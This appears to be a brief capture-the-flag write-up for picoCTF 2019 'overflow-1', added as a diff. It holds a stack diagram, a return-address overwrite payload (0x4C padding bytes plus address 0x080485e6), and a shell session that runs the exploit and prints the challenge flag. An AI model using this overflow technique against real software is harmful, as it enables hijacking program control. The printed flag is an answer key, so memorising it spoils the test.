@@ -1,0 +1,27 @@
+
+
+1->	
+
+
+
+	ebp - 0x48
+
+
+
+
+
+
+	ebx
+0->	ebp
+	eip
+
+
+payload = 'A' * (0x48 + 0x4)
+payload += "\xe6\x85\x04\x08"
+
+tomteam@pico-2019-shell1:/problems/overflow-1_4_6e02703f87bc36775cc64de920dfcf5a$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe6\x85\x04\x08' | ./vuln
+Give me a string and lets see what happens: 
+Woah, were jumping to 0x80485e6 !
+picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}Segmentation fault (core dumped)
+tomteam@pico-2019-shell1:/problems/overflow-1_4_6e02703f87bc36775cc64de920dfcf5a$ 
